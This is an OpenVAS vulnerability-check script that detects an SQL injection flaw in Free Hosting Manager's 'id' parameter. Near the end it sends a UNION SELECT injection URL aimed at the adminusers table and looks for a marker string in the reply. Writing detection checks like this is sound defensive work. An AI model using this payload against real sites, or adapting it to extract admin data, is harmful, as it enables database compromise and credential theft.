###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_fhm_56754.nasl 3062 2016-04-14 11:03:39Z benallard $
#
# Free Hosting Manager 'id' Parameter SQL Injection Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_summary = "Free Hosting Manager is prone to an SQL-injection vulnerability
because it fails to sufficiently sanitize user-supplied data before
using it in an SQL query.

An attacker can exploit this issue to compromise the application,
access or modify data, or exploit latent vulnerabilities in the
underlying database.

Free Hosting Manager 2.0 is vulnerable; other versions may also
be affected.";


SCRIPT_OID  = "1.3.6.1.4.1.25623.1.0.103618";

if (description)
{
 script_oid(SCRIPT_OID);
 script_bugtraq_id(56754);
 script_tag(name:"cvss_base", value:"9.0");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:P/A:P");
 script_version ("$Revision: 3062 $");

 script_name("Free Hosting Manager 'id' Parameter SQL Injection Vulnerability");

 script_xref(name : "URL" , value : "http://www.securityfocus.com/bid/56754");
 script_xref(name : "URL" , value : "http://www.fhm-script.com/index.php");

 script_tag(name:"last_modification", value:"$Date: 2016-04-14 13:03:39 +0200 (Thu, 14 Apr 2016) $");
 script_tag(name:"creation_date", value:"2012-12-04 11:39:15 +0100 (Tue, 04 Dec 2012)");
 script_summary("Determine if is is possible to inject sql code");
 script_category(ACT_ATTACK);
 script_tag(name:"qod_type", value:"remote_vul");
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2012 Greenbone Networks GmbH");
 script_dependencies("find_service.nasl", "http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 script_tag(name : "summary" , value : tag_summary);
 exit(0);
}

include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");
   
port = get_http_port(default:80);
if(!get_port_state(port))exit(0);

if(!can_host_php(port:port))exit(0);

dirs = make_list('/fhm','/hostingmanager',cgi_dirs());

foreach dir (dirs) {
   
  url = dir + '/index.php';

  if(http_vuln_check(port:port, url:url,pattern:"<title>.*Free Hosting Manager</title>")) {

    url = dir + "/clients/packages.php?id=-1'+UNION+ALL+SELECT+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,0x4f70656e5641532d53514c2d496e6a656374696f6e2d54657374+from+adminusers%23";

    if(http_vuln_check(port:port, url:url,pattern:"OpenVAS-SQL-Injection-Test")) {
     
      security_message(port:port);
      exit(0);

    }

  }
}

exit(0);
